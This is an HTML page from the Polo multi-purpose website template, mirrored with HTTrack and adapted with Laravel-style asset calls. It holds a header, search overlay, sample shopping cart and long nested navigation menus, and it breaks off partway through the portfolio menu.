<!DOCTYPE html>
<html lang="en">

<!-- Mirrored from www.inspirothemes.com/polo/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 30 Sep 2019 06:24:05 GMT -->

<head>
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
    <meta name="author" content="INSPIRO" />
    <meta name="description" content="Themeforest Template Polo">

    <title>POLO | The Multi-Purpose HTML5 Template</title>

    <link href="{{asset('site/css/plugins.css')}}" rel="stylesheet">
    <link href="{{asset('site/css/style.css')}}" rel="stylesheet">
    <link href="{{asset('site/css/responsive.css')}}" rel="stylesheet">
</head>

<body>

    <div class="body-inner">

        <header id="header" data-transparent="true" class="dark">
            <div class="header-inner">
                <div class="container">

                    <div id="logo">
                        <a href="index.html" class="logo" data-src-dark="{{asset('site/images/logo-dark.png')}}">
                            <img src="{{asset('site/images/logo.png')}}" alt="Polo Logo">
                        </a>
                    </div>


                    <div id="search">
                        <div id="search-logo"><img src="{{asset('site/images/logo.png')}}" alt="Polo Logo"></div>
                        <button id="btn-search-close" class="btn-search-close" aria-label="Close search form"><i
                                class="icon-x"></i></button>
                        <form class="search-form" action="http://www.inspirothemes.com/polo/search-results-page.html"
                            method="get">
                            <input class="form-control" name="q" type="search" placeholder="Search..."
                                autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" />
                            <span class="text-muted">Start typing & press "Enter" or "ESC" to close</span>
                        </form>
                        <div class="search-suggestion-wrapper">
                            <div class="search-suggestion">
                                <h3>News Articles</h3>
                                <p><a href="#">Beautiful nature, and rare feathers!</a></p>
                                <p><a href="#">New costs and rise of the economy!</a></p>
                                <p><a href="#">A true story, that never been told!</a></p>
                            </div>
                            <div class="search-suggestion">
                                <h3>Looking for these?</h3>
                                <p><a href="#">New costs and rise of the economy!</a></p>
                                <p><a href="#">AI can be trusted to take answer calls </a></p>
                                <p><a href="#">Polo now lets you easily create any beautiful clean website</a></p>
                            </div>
                            <div class="search-suggestion">
                                <h3>Blog Posts</h3>
                                <p><a href="#">A true story, that never been told!</a></p>
                                <p><a href="#">Beautiful nature, and rare feathers!</a></p>
                                <p><a href="#">The most happiest time of the day!</a></p>
                            </div>
                        </div>
                    </div>


                    <div class="header-extras">
                        <ul>
                            <li>

                                <a id="btn-search" href="#"> <i class="icon-search1"></i></a>

                            </li>
                            <li class="d-none d-sm-block">

                                <div id="shopping-cart" class="p-dropdown">
                                    <a href="shop-cart.html"><span class="shopping-cart-items">8</span><i
                                            class="icon-shopping-cart1"></i></a>
                                    <div class="p-dropdown-content ">
                                        <div class="widget-mycart">
                                            <h4>My Cart</h4>
                                            <div class="cart-item">
                                                <div class="cart-image"> <a href="#"><img
                                                            src="{{asset('site/images/shop/products/10.jpg')}}"></a>
                                                </div>
                                                <div class="cart-product-meta">
                                                    <a href="#">Bolt Sweatshirt</a>
                                                    <span>3 x 28$</span>
                                                </div>
                                                <div class="cart-item-remove">
                                                    <a href="#"><i class="icon-x"></i></a></div>
                                            </div>
                                            <div class="cart-item">
                                                <div class="cart-image"> <a href="#"><img
                                                            src="{{asset('site/images/shop/products/11.jpg')}}"></a>
                                                </div>
                                                <div class="cart-product-meta">
                                                    <a href="#">Yellow Sweatshirt</a>
                                                    <span>1 x 18$</span>
                                                </div>
                                                <div class="cart-item-remove">
                                                    <a href="#"><i class="icon-x"></i></a></div>
                                            </div>
                                            <hr>
                                            <div class="cart-total">
                                                <div class="cart-total-labels">
                                                    <span>Subtotal</span>
                                                    <span>Taxes</span>
                                                    <span><strong>Total</strong></span>
                                                </div>
                                                <div class="cart-total-prices">
                                                    <span>320$</span>
                                                    <span>8%</span>
                                                    <span><strong>385$</strong></span>
                                                </div>
                                            </div>
                                            <div class="cart-buttons text-right">
                                                <button class="btn btn-xs">Checkout</button>
                                            </div>
                                        </div>
                                    </div>
                                </div>

                            </li>
                            <li>
                                <div class="p-dropdown">
                                    <a href="#"><i class="icon-flag11"></i></a>
                                    <ul class="p-dropdown-content">
                                        <li><a href="#">French</a></li>
                                        <li><a href="#">Spanish</a></li>
                                        <li><a href="#">English</a></li>
                                    </ul>
                                </div>
                            </li>
                        </ul>
                    </div>


                    <div id="mainMenu-trigger">
                        <button class="lines-button x"> <span class="lines"></span> </button>
                    </div>


                    <div id="mainMenu" class="menu-uppercase">
                        <div class="container">
                            <nav>
                                <ul>
                                    <li><a href="index.html">Home</a></li>
                                    <li class="dropdown"> <a href="#">Layout</a>
                                        <ul class="dropdown-menu">
                                            <li class="dropdown-submenu"><a href="#">Topbar</a>
                                                <ul class="dropdown-menu">
                                                    <li><a href="header-topbar.html">Light</a></li>
                                                    <li><a href="header-topbar-dark.html">Dark</a></li>
                                                    <li><a href="header-topbar-transparent.html">Transparent</a></li>
                                                    <li><a href="header-topbar-colored.html">Colored</a></li>
                                                    <li><a href="header-topbar-fullwidth.html">Fullwidth</a></li>
                                                </ul>
                                            </li>
                                            <li class="dropdown-submenu"><a href="#">Header</a>
                                                <ul class="dropdown-menu">
                                                    <li><a href="header.html">Light</a></li>
                                                    <li><a href="header-dark.html">Dark</a></li>
                                                    <li><a href="header-transparent.html">Transparent</a></li>
                                                    <li><a href="header-colored.html">Colored</a></li>
                                                    <li><a href="header-fullwidth.html">Fullwidth</a></li>
                                                    <li class="dropdown-submenu"><a href="#">Modern</a>
                                                        <ul class="dropdown-menu">
                                                            <li><a href="header-modern.html">Light</a></li>
                                                            <li><a href="header-modern-dark.html">Dark</a></li>
                                                            <li><a href="header-modern-transparent.html">Transparent</a>
                                                            </li>
                                                            <li><a href="header-modern-colored.html">Colored</a></li>
                                                        </ul>
                                                    </li>
                                                    <li><a href="header-mini.html">Mini</a></li>
                                                    <li><a href="header-always-fixed.html">Always Fixed</a></li>
                                                    <li><a href="header-disable-fixed.html">Disable Fixed</a></li>
                                                    <li><a href="header-responsive-fixed.html">Responsive Fixed</a></li>
                                                    <li class="dropdown-submenu"><a href="#">Logo</a>
                                                        <ul class="dropdown-menu">
                                                            <li><a href="header-logo.html">Left</a></li>
                                                            <li><a href="header-logo-right.html">Right</a></li>
                                                            <li><a href="header-logo-center.html">Center</a></li>
                                                            <li><a href="header-logo-fixed-header.html">Header Fixed
                                                                    Logo</a></li>
                                                            <li><a href="header-logo-responsive.html">Header Responsive
                                                                    Logo</a></li>
                                                        </ul>
                                                    </li>
                                                    <li class="dropdown-submenu"><a href="#">Menu Positions</a>
                                                        <ul class="dropdown-menu">
                                                            <li><a href="header-menu-left.html">Left</a></li>
                                                            <li><a href="header-menu-right.html">Right</a></li>
                                                            <li><a href="header-menu-center.html">Center</a></li>
                                                        </ul>
                                                    </li>
                                                </ul>
                                            </li>
                                            <li class="dropdown-submenu"><a href="#">Main Menu<span
                                                        class="badge badge-danger">NEW</span></a>
                                                <ul class="dropdown-menu">
                                                    <li><a href="menu.html">Default</a></li>
                                                    <li><a href="menu-lowercase.html">Lowercase</a></li>
                                                    <li><a href="menu-split.html">Split Menu</a></li>
                                                    <li><a href="menu-sub-title.html">Sub Title Menu</a></li>
                                                    <li><a href="menu-slide.html">Slide Menu</a></li>
                                                    <li><a href="menu-overlay.html">Overlay Menu</a></li>
                                                    <li><a href="menu-creative.html">Creative Menu</a></li>
                                                    <li><a href="menu-lines.html">Lines Menu</a></li>
                                                    <li class="dropdown-submenu"><a href="#">Outline</a>
                                                        <ul class="dropdown-menu">
                                                            <li><a href="menu-outline.html">Default</a></li>
                                                            <li><a href="menu-outline-dark.html">Dark</a></li>
                                                            <li><a href="menu-outline-light.html">Light</a></li>
                                                        </ul>
                                                    </li>
                                                    <li class="dropdown-submenu"><a href="#">Rounded</a>
                                                        <ul class="dropdown-menu">
                                                            <li><a href="menu-rounded.html">Default</a></li>
                                                            <li><a href="menu-rounded-dark.html">Dark</a></li>
                                                            <li><a href="menu-rounded-light.html">Light</a></li>
                                                        </ul>
                                                    </li>
                                                    <li class="dropdown-submenu"><a href="#">Positions</a>
                                                        <ul class="dropdown-menu">
                                                            <li><a href="menu-left.html">Left Aligned</a></li>
                                                            <li><a href="menu-center.html">Center Aligned</a></li>
                                                            <li><a href="menu-right.html">Right Aligned</a></li>
                                                        </ul>
                                                    </li>
                                                    <li><a href="menu-dots.html">Dots Menu</a></li>
                                                    <li><a href="menu-one-page.html">One Page Menu</a></li>
                                                    <li><a href="menu-hover-background.html">Hover Background</a></li>
                                                    <li><a href="menu-button.html">Button Version</a></li>
                                                    <li><a href="menu-social-icons.html">Social Icons Version</a></li>
                                                    <li><a href="menu-onclick.html">OnClick Open</a></li>
                                                    <li><a href="menu-rounded-dropdown.html">Rounded Dropdown</a></li>
                                                </ul>
                                            </li>
                                            <li class="dropdown-submenu"><a href="#">Page Title</a>
                                                <ul class="dropdown-menu">
                                                    <li><a href="page-title.html">Default</a></li>
                                                    <li><a href="page-title-image.html">Image background</a> </li>
                                                    <li><a href="page-title-video.html">Video background</a> </li>
                                                    <li><a href="page-title-pattern.html">Pattern background</a> </li>
                                                    <li><a href="page-title-background-color.html">Colored
                                                            background</a> </li>
                                                    <li><a href="page-title-parallax.html">Parallax</a></li>
                                                    <li><a href="page-title-animated.html">Animated</a></li>
                                                    <li><a href="page-title-right.html">Right Aligned</a></li>
                                                    <li><a href="page-title-left.html">Left Aligned</a></li>
                                                </ul>
                                            </li>
                                            <li class="dropdown-submenu"><a href="#">Page Menu<span
                                                        class="badge badge-danger">NEW</span></a>
                                                <ul class="dropdown-menu">
                                                    <li><a href="page-menu.html">Default</a></li>
                                                    <li><a href="page-menu-rounded.html">Rounded</a></li>
                                                    <li><a href="page-menu-outline.html">Outline</a></li>
                                                    <li><a href="page-menu-lines.html">Lines</a></li>
                                                    <li><a href="page-menu-solid.html">Solid</a> </li>
                                                    <li><a href="page-menu-light.html">Light</a> </li>
                                                    <li><a href="page-menu-dark.html">Dark</a> </li>
                                                    <li><a href="page-menu-creative.html">Creative</a> </li>
                                                    <li><a href="page-menu.html">Dropdown</a></li>
                                                </ul>
                                            </li>
                                            <li class="dropdown-submenu"><a href="#">Sidebars</a>
                                                <ul class="dropdown-menu">
                                                    <li><a href="sidebar-sticky.html">Sticky version</a> </li>
                                                    <li><a href="sidebar.html">Left aligned</a> </li>
                                                    <li><a href="sidebar-right.html">Right aligned</a> </li>
                                                    <li><a href="sidebar-both.html">Both Sidebars</a> </li>
                                                    <li><a href="sidebar-modern.html">Modern</a> </li>
                                                    <li><a href="sidebar-modern-right.html">Modern Right</a> </li>
                                                    <li><a href="sidebar-modern-both.html">Modern Both Sidebars</a>
                                                    </li>
                                                </ul>
                                            </li>
                                            <li class="dropdown-submenu"><a href="#">Footers</a>
                                                <ul class="dropdown-menu">
                                                    <li><a href="footer.html#footer">Default</a> </li>
                                                    <li><a href="footer-dark.html#footer">Dark</a> </li>
                                                    <li><a href="footer-1.html#footer">Footer 1</a> </li>
                                                    <li><a href="footer-2.html#footer">Footer 2</a> </li>
                                                    <li><a href="footer-3.html#footer">Footer 3</a> </li>
                                                    <li><a href="footer-4.html#footer">Footer 4</a> </li>
                                                    <li><a href="footer-5.html#footer">Footer 5</a> </li>
                                                    <li><a href="#">Comming soon</a> </li>
                                                    <li><a href="#">Comming soon</a> </li>
                                                    <li><a href="#">Comming soon</a> </li>
                                                    <li><a href="#">Comming soon</a> </li>
                                                    <li><a href="#">Comming soon</a> </li>
                                                </ul>
                                            </li>
                                            <li class="dropdown-submenu"><a href="#">Options</a>
                                                <ul class="dropdown-menu">
                                                    <li><a href="#">Boxed</a></li>
                                                    <li><a href="#">Wide</a></li>
                                                    <li><a href="#">Modern</a></li>
                                                    <li><a href="#">Border</a></li>
                                                </ul>
                                            </li>
                                            <li><a href="preview/index.html">Layout Demos<span
                                                        class="badge badge-primary">200+</span></a></li>
                                        </ul>
                                    </li>
                                    <li class="dropdown"> <a href="#">Features</a>
                                        <ul class="dropdown-menu">
                                            <li class="dropdown-submenu"><a href="#">Sliders</a>
                                                <ul class="dropdown-menu">
                                                    <li><a href="slider-revolution-slider.html">Revolution Slider</a>
                                                    </li>
                                                    <li><a href="slider-owl-slider.html">OWL Slider</a></li>
                                                    <li><a href="slider-static-media-image.html">Fullscreen Image</a>
                                                    </li>
                                                    <li><a href="slider-static-media-parallax.html">Fullscreen
                                                            Parallax</a></li>
                                                    <li><a href="slider-static-media-text-rotator.html">Fullscreen Text
                                                            Rotator</a></li>
                                                    <li><a href="slider-static-media-video.html">Fullscreen HTML5
                                                            Video</a></li>
                                                </ul>
                                            </li>
                                            <li><a href="widgets.html">Widgets </a></li>
                                            <li><a href="page-loaders.html">Page Loaders<span
                                                        class="badge badge-danger">NEW</span></a></li>
                                            <li class="dropdown-submenu"><a href="#">Modal Auto Open<span
                                                        class="badge badge-danger">NEW</span></a>
                                                <ul class="dropdown-menu">
                                                    <li><a href="modal-auto-open-subscription.html">Subscription</a>
                                                    </li>
                                                    <li><a href="modal-auto-open-shop.html">Shop Promotion</a></li>
                                                    <li><a href="modal-auto-open-login.html">Login Form</a></li>
                                                    <li><a href="modal-auto-open-audio.html">Audio Player</a></li>
                                                    <li><a href="modal-auto-open-video.html">HTML5 Video</a></li>
                                                    <li><a href="modal-auto-open-youtube.html">YouTube Video</a></li>
                                                    <li><a href="modal-auto-open-vimeo.html">Vimeo Video</a></li>
                                                    <li><a href="modal-auto-open-iframe.html">Iframe</a></li>
                                                    <li><a href="modal-auto-open.html">Sample Text</a></li>
                                                </ul>
                                            </li>
                                            <li class="dropdown-submenu"><a href="#">Cookie Notify<span
                                                        class="badge badge-danger">NEW</span></a>
                                                <ul class="dropdown-menu">
                                                    <li><a href="cookie-notify.html">Top position</a> </li>
                                                    <li><a href="cookie-notify-bottom.html">Bottom position</a> </li>
                                                </ul>
                                            </li>
                                            <li class="dropdown-submenu"><a href="#">Menu Labels</a>
                                                <ul class="dropdown-menu">
                                                    <li><a href="#">Label (new)<span
                                                                class="badge badge-danger">NEW</span></a> </li>
                                                    <li><a href="#">Label (hot)<span
                                                                class="badge badge-danger">HOT</span></a> </li>
                                                    <li><a href="#">Label (popular)<span
                                                                class="badge badge-success">POPULAR</span></a> </li>
                                                    <li><a href="#">Label (sale)<span
                                                                class="badge badge-warning">SALE</span></a> </li>
                                                    <li><a href="#">Label (info)<span
                                                                class="badge badge-info">INFO</span></a> </li>
                                                </ul>
                                            </li>
                                        </ul>
                                    </li>
                                    <li class="dropdown mega-menu-item"> <a href="#">Elements</a>
                                        <ul class="dropdown-menu">
                                            <li class="mega-menu-content">
                                                <div class="row">
                                                    <div class="col-lg-2">
                                                        <ul>
                                                            <li>
                                                                <a href="shortcode-according.html"> <i
                                                                        class="fa fa-list-ul"></i>Accordions</a>
                                                            </li>
                                                            <li>
                                                                <a href="shortcode-alerts.html"> <i
                                                                        class="fa fa-exclamation-circle"></i>Alerts</a>
                                                            </li>
                                                            <li>
                                                                <a href="shortcode-animations.html"> <i
                                                                        class="fa fa-magic"></i>Animations</a>
                                                            </li>
                                                            <li>
                                                                <a href="shortcode-audio-video.html"> <i
                                                                        class="fa fa-play-circle"></i> Audio & Video</a>
                                                            </li>
                                                            <li>
                                                                <a href="shortcode-blockquotes.html"> <i
                                                                        class="fa fa-quote-right"></i>Blockquotes</a>
                                                            </li>
                                                            <li>
                                                                <a href="component-bootstrap-switch.html"> <i
                                                                        class="fas fa-toggle-off"></i>BS Switch<span
                                                                        class="badge badge-danger">NEW</span></a>
                                                            </li>
                                                            <li>
                                                                <a href="component-bootstrap-notify.html"> <i
                                                                        class="fas fa-flag-checkered"></i>BS Notify<span
                                                                        class="badge badge-danger">NEW</span></a>
                                                            </li>
                                                            <li>
                                                                <a href="shortcode-breadcrumbs.html"> <i
                                                                        class="fa fa-angle-double-right"></i>Breadcrumbs</a>
                                                            </li>
                                                            <li> <a href="shortcode-buttons.html"> <i
                                                                        class="fas fa-external-link-square-alt"></i>Buttons</a>
                                                            </li>
                                                            <li> <a href="component-charts-chartjs.html"> <i
                                                                        class="fas fa-chart-bar"></i>Charts <span
                                                                        class="badge badge-danger">NEW</span></a> </li>
                                                        </ul>
                                                    </div>
                                                    <div class="col-lg-2">
                                                        <ul>
                                                            <li> <a href="component-calendar.html"> <i
                                                                        class="far fa-calendar-alt"></i>Calendar <span
                                                                        class="badge badge-danger">NEW</span></a></li>
                                                            <li><a href="shortcode-client-logo.html"> <i
                                                                        class="far fa-gem"></i>Clients logos</a></li>
                                                            <li>
                                                                <a href="shortcode-calltoaction.html"> <i
                                                                        class="fa fa-plus-square"></i>Call to action</a>
                                                            </li>
                                                            <li>
                                                                <a href="shortcode-carousel.html"> <i
                                                                        class="fas fa-exchange-alt"></i>Carousel</a>
                                                            </li>
                                                            <li>
                                                                <a href="shortcode-code.html"> <i
                                                                        class="fa fa-code"></i>Code</a>
                                                            </li>
                                                            <li>
                                                                <a href="shortcode-countdown-timer.html"> <i
                                                                        class="far fa-clock"></i>Countdown Timers</a>
                                                            </li>
                                                            <li>
                                                                <a href="shortcode-countdown.html"> <i
                                                                        class="fa fa-stopwatch"></i>Countdown <span
                                                                        class="badge badge-danger">NEW</span></a>
                                                            </li>
                                                            <li><a href="shortcode-counters.html"> <i
                                                                        class="fas fa-sort-numeric-down "></i>Counter
                                                                    Numbers</a></li>
                                                            <li> <a href="component-datatable.html"> <i
                                                                        class="fa fa-table"></i>Data Tables <span
                                                                        class="badge badge-danger">NEW</span></a></li>
                                                            <li>
                                                                <a href="component-daterangepicker.html"><i
                                                                        class="fa fa-calendar-alt"></i>Date & Time
                                                                    Pickers</a>
                                                            </li>
                                                        </ul>
                                                    </div>
                                                    <div class="col-lg-2">
                                                        <ul>
                                                            <li>
                                                                <a href="shortcode-dropcat-highlight.html"> <i
                                                                        class="fa fa-bold"></i>Dropcat & Highlight</a>
                                                            </li>
                                                            <li>
                                                                <a href="shortcode-dropdowns.html"> <i
                                                                        class="fa  fa-lightbulb"></i>Dropdown <span
                                                                        class="badge badge-danger">NEW</span></a>
                                                            </li>
                                                            <li>
                                                                <a href="shortcode-team-members.html"> <i
                                                                        class="fa fa-users"></i>Team members</a>
                                                            </li>
                                                            <li>
                                                                <a href="shortcode-forms.html"> <i
                                                                        class="fa fa-align-justify"></i>Forms</a>
                                                            </li>
                                                            <li>
                                                                <a href="shortcode-grid.html"><i
                                                                        class="fa fa-th"></i>Grid System</a></li>
                                                            <li>
                                                                <a href="shortcode-heading-styles.html"><i
                                                                        class="fa fa-heading"></i>Heading Styles</a>
                                                            </li>
                                                            <li>
                                                                <a href="shortcode-icon-boxes.html"> <i
                                                                        class="fa fa-bullseye"></i>Icon Boxes</a>
                                                            </li>
                                                            <li>
                                                                <a href="shortcode-icon-lists.html"> <i
                                                                        class="fa fa-flag"></i>Icons
                                                                </a>
                                                            </li>
                                                            <li>
                                                                <a href="shortcode-images.html"> <i
                                                                        class="far fa-image"></i>Images</a>
                                                            </li>
                                                            <li>
                                                                <a href="shortcode-labels-badgets.html"> <i
                                                                        class="fa fa-check-square"></i>Labels and
                                                                    Badges</a>
                                                            </li>
                                                        </ul>
                                                    </div>
                                                    <div class="col-lg-2">
                                                        <ul>
                                                            <li>
                                                                <a href="shortcode-lightbox.html"> <i
                                                                        class="fa fa-arrows-alt"></i>Lightbox</a>
                                                            </li>
                                                            <li>
                                                                <a href="shortcode-lists.html"> <i
                                                                        class="fa fa-th-list"></i>Lists & Bullet
                                                                    lists</a>
                                                            </li>
                                                            <li>
                                                                <a href="shortcode-maps.html"> <i
                                                                        class="fa fa-compass"></i>Maps</a>
                                                            </li>
                                                            <li>
                                                                <a href="shortcode-modal.html"> <i
                                                                        class="fa fa-search-plus"></i>Modal</a>
                                                            </li>
                                                            <li>
                                                                <a href="shortcode-modal-strip.html"> <i
                                                                        class="fas fa-bolt"></i>Modal Strip</a>
                                                            </li>
                                                            <li>
                                                                <a href="shortcode-navs.html"> <i
                                                                        class="fa fa-bars"></i>Navbar & Navs</a>
                                                            </li>
                                                            <li>
                                                                <a href="shortcode-paginations.html"> <i
                                                                        class="fa fa-arrow-circle-right"></i>Pagination
                                                                    & Pager</a>
                                                            </li>
                                                            <li>
                                                                <a href="shortcode-panels.html"> <i
                                                                        class="fa fa-list-alt"></i>Panels</a>
                                                            </li>
                                                            <li> <a href="shortcode-pie-chart.html"><i
                                                                        class="fas fa-chart-pie"></i>Pie charts</a>
                                                            </li>
                                                            <li> <a href="shortcode-popover-tooltip.html"><i
                                                                        class="far fa-lightbulb"></i>Popover &
                                                                    tooltips</a> </li>
                                                        </ul>
                                                    </div>
                                                    <div class="col-lg-2">
                                                        <ul>
                                                            <li> <a href="shortcode-pricing-table.html"><i
                                                                        class="fas fa-dollar-sign"></i>Pricing
                                                                    tables</a> </li>
                                                            <li>
                                                                <a href="shortcode-progress-bar.html"> <i
                                                                        class="fa fa-align-left"></i>Progress bars</a>
                                                            </li>
                                                            <li>
                                                                <a href="shortcode-parallax.html"> <i
                                                                        class="fa fa-gift"></i>Parallax</a>
                                                            </li>
                                                            <li>
                                                                <a href="shortcode-particles.html"> <i
                                                                        class="fab fa-connectdevelop"></i>Particles
                                                                    <span class="badge badge-danger">NEW</span></a>
                                                            </li>
                                                            <li>
                                                                <a href="shortcode-responsive-utilities.html"> <i
                                                                        class="fa fa-laptop"></i>Responsive
                                                                    utilities</a>
                                                            </li>
                                                            <li>
                                                                <a href="component-ion-range-slider.html"> <i
                                                                        class="fas fa-exchange-alt"></i>Range
                                                                    Slider<span
                                                                        class="badge badge-danger">NEW</span></a>
                                                            </li>
                                                            <li>
                                                                <a href="shortcode-sections.html"> <i
                                                                        class="fa fa-bookmark"></i>Sections</a>
                                                            </li>
                                                            <li>
                                                                <a href="shortcode-smooth-scrolling.html"> <i
                                                                        class="fa fa-anchor"></i>Smooth Scrolling</a>
                                                            </li>
                                                            <li>
                                                                <a href="shortcode-social-icons.html"> <i
                                                                        class="fab fa-facebook"></i>Social Icons</a>
                                                            </li>
                                                            <li>
                                                                <a href="component-toggles-radio-checkboxes.html"> <i
                                                                        class="fas fa-toggle-on"></i>Switch Toggle<span
                                                                        class="badge badge-danger">NEW</span></a>
                                                            </li>
                                                        </ul>
                                                    </div>
                                                    <div class="col-lg-2">
                                                        <ul>
                                                            <li>
                                                                <a href="shortcode-tables.html"> <i
                                                                        class="fa fa-table"></i>Tables</a></li>
                                                            <li>
                                                                <a href="shortcode-textbox.html"> <i
                                                                        class="fa fa-star"></i>Text
                                                                    Boxes</a>
                                                            </li>
                                                            <li><a href="shortcode-tabs.html"> <i
                                                                        class="fa fa-indent"></i>Tabs</a>
                                                            </li>
                                                            <li>
                                                                <a href="shortcode-testimonial.html"> <i
                                                                        class="fa fa-question-circle"></i>Testimonials</a>
                                                            </li>
                                                            <li>
                                                                <a href="shortcode-toggles.html"> <i
                                                                        class="fa fa-toggle-on"></i>Toggles</a>
                                                            </li>
                                                            <li>
                                                                <a href="shortcode-typography.html"> <i
                                                                        class="fa fa-font"></i>Typography</a>
                                                            </li>
                                                            <li>
                                                                <a href="shortcode-text-rotator.html"> <i
                                                                        class="fa fa-random"></i>Text Rotator</a>
                                                            </li>
                                                            <li>
                                                                <a href="component-clipboard.html"> <i
                                                                        class="far fa-clipboard"></i>Clipboard <span
                                                                        class="badge badge-danger">NEW</span></a>
                                                            </li>
                                                        </ul>
                                                    </div>
                                                </div>
                                            </li>
                                        </ul>
                                    </li>
                                    <li class="dropdown"> <a href="#">Pages</a>
                                        <ul class="dropdown-menu">
                                            <li class="dropdown-submenu"><span class="dropdown-menu-title-only">About
                                                    us</span>
                                                <ul class="dropdown-menu">
                                                    <li><a href="page-about-basic.html">Basic</a> </li>
                                                    <li><a href="page-about-extended.html">Extended</a> </li>
                                                </ul>
                                            </li>
                                            <li class="dropdown-submenu"><span class="dropdown-menu-title-only">About
                                                    me</span>
                                                <ul class="dropdown-menu">
                                                    <li><a href="page-about-me-creative.html">Creative<span
                                                                class="badge badge-danger">NEW</span></a></li>
                                                    <li><a href="page-about-me-basic.html">Basic</a></li>
                                                    <li><a href="page-about-me-extended.html">Extended</a> </li>
                                                </ul>
                                            </li>
                                            <li class="dropdown-submenu"><span class="dropdown-menu-title-only">Contact
                                                    us</span>
                                                <ul class="dropdown-menu">
                                                    <li><a href="page-contact-classic.html">Classic</a> </li>
                                                    <li><a href="page-contact-fullwidth-map.html">Fullwidth Map</a>
                                                    </li>
                                                    <li><a href="page-contact-fullscreen-map.html">Fullscreen Map</a>
                                                    </li>
                                                    <li><a href="page-contact-map-bottom.html">Map bottom</a> </li>
                                                    <li><a href="page-contact-sidebar-left.html">Sidebar Left</a> </li>
                                                    <li><a href="page-contact-sidebar-right.html">Sidebar Right</a>
                                                    </li>
                                                </ul>
                                            </li>
                                            <li class="dropdown-submenu"><span
                                                    class="dropdown-menu-title-only">Gallery</span>
                                                <ul class="dropdown-menu">
                                                    <li> <a href="page-gallery-2.html">Two Columns</a> </li>
                                                    <li> <a href="page-gallery-3.html">Three Columns</a> </li>
                                                    <li> <a href="page-gallery-4.html">Four Columns</a> </li>
                                                    <li> <a href="page-gallery-5.html">Five Columns</a> </li>
                                                    <li> <a href="page-gallery-6.html">Six Columns</a> </li>
                                                    <li> <a href="page-gallery-sidebar.html">Sidebar version</a> </li>
                                                    <li> <a href="page-gallery-wide.html">Wide version</a> </li>
                                                    <li> <a href="page-gallery-load-more.html">Load more</a> </li>
                                                    <li> <a href="page-gallery-infinite-scroll.html">Infinity Scroll</a>
                                                    </li>

                                                </ul>
                                            </li>
                                            <li class="dropdown-submenu"><span class="dropdown-menu-title-only">User
                                                    pages</span>
                                                <ul class="dropdown-menu">
                                                    <li><a href="page-user-login.html">Login</a> </li>
                                                    <li><a href="page-user-login-classic.html">Login - Classic</a> </li>
                                                    <li><a href="page-user-register.html">Register</a> </li>
                                                    <li><a href="page-user-register-classic.html">Register - Classic</a>
                                                    </li>
                                                    <li><a href="page-user-password-recovery.html">Recovery Password</a>
                                                    </li>
                                                </ul>
                                            </li>
                                            <li> <a href="page-services.html">Services</a> </li>
                                            <li> <a href="page-our-team.html">Our team</a> </li>
                                            <li> <a href="page-our-clients.html">Our clients</a> </li>
                                            <li> <a href="page-maintenance.html">Maintenance</a> </li>
                                            <li> <a href="page-404.html">404 Page</a> </li>
                                            <li> <a href="page-404-parallax.html">404 Page - Parallax</a> </li>
                                            <li> <a href="page-500.html">500 Page</a> </li>
                                            <li> <a href="page-fullwidth.html">Fullwidth page</a> </li>
                                            <li> <a href="page-fullwidth-wide.html">Fullwidth page - Wide</a> </li>
                                            <li class="dropdown-submenu"><span class="dropdown-menu-title-only">Page
                                                    with Sidebar</span>
                                                <ul class="dropdown-menu">
                                                    <li> <a href="page-sidebar.html">Sidebar Left</a> </li>
                                                    <li> <a href="page-sidebar-right.html">Sidebar Right</a> </li>
                                                    <li> <a href="page-sidebar-both.html">Sidebar Both</a> </li>
                                                </ul>
                                            </li>
                                            <li> <a href="page-site-map.html">Site Map</a> </li>
                                            <li> <a href="page-faq.html">FAQ</a> </li>
                                        </ul>
                                    </li>
                                    <li class="dropdown mega-menu-item"> <a href="#">Portfolio</a>
                                        <ul class="dropdown-menu">
                                            <li class="mega-menu-content">
                                                <div class="row">
                                                    <div class="col-lg-2-5">
                                                        <ul>
                                                            <li class="mega-menu-title">Grids</li>
                                                            <li> <a href="portfolio-2.html">Two Columns</a> </li>
                                                            <li> <a href="portfolio-3.html">Three Columns</a> </li>
                                                            <li> <a href="portfolio-4.html">Four Columns</a> </li>
                                                            <li> <a href="portfolio-5.html">Five Columns</a> </li>
                                                            <li> <a href="portfolio-6.html">Six Columns</a> </li>
                                                            <li> <a href="portfolio-sidebar.html">Sidebar version</a>
                                                            </li>
                                                            <li> <a href="portfolio-wide-3.html">Wide version</a> </li>
                                                        </ul>
                                                    </div>
                                                    <div class="col-lg-2-5">
                                                        <ul>
                                                            <li class="mega-menu-title">Masonry</li>
                                                            <li> <a href="portfolio-masonry-2.html">Two Columns</a>
                                                            </li>
                                                            <li> <a href="portfolio-masonry-3.html">Three Columns<span
                                                                        class="badge badge-danger">HOT</span></a> </li>
                                                            <li> <a href="portfolio-masonry-4.html">Four Columns</a>
                                                            </li>
                                                            <li> <a href="portfolio-masonry-5.html">Five Columns</a>
                                                            </li>
                                                            <li> <a href="portfolio-masonry-6.html">Six Columns</a>
                                                            </li>
                                                            <li> <a href="portfolio-masonry-sidebar.html">Sidebar
                                                                    version</a> </li>
                                                            <li> <a href="portfolio-masonry-wide-3.html">Wide
                                                                    version</a> </li>
                                                        </ul>
                                                    </div>
                                                    <div class="col-lg-2-5">
                                                        <ul>
                                                            <li class="mega-menu-title">Styles</li>
                                                            <li> <a href="portfolio-filter-styles.html">Filter
                                                                    Styles</a> </li>
                                                            <li> <a href="portfolio-load-more.html">Load more</a> </li>
                                                            <li> <a href="portfolio-load-more-sidebar.html">Load more -
                                                                    Sidebar</a> </li>
                                                            <li> <a href="portfolio-infinite-scroll.html">Infinity
                                                                    Scroll</a> </li>
                                                            <li> <a href="portfolio-ajax.html">Portfolio Ajax</a> </li>
                                                            <li> <a href="portfolio-gallery-modal.html">Gallery
                                                                    Modal</a> </li>
                                                            <li> <a href="portfolio-video-modal.html">Video Modal</a>
                                                            </li>
                                                        </ul>
                                                    </div>
                                                    <div class="col-lg-2-5">
                                                        <ul>
                                                            <li class="mega-menu-title">Layouts</li>
                                                            <li> <a href="portfolio-sidebar-left.html">Left Sidebar</a>
                                                            </li>
                                                            <li> <a href="portfolio-sidebar-right.html">Right
                                                                    Sidebar</a> </li>
                                                            <li> <a href="portfolio-sidebar-both.html">Both Sidebars</a>
                                                            </li>
                                                            <li> <a href="portfolio-slider-3.html">Slider Default</a>
                                                            </li>
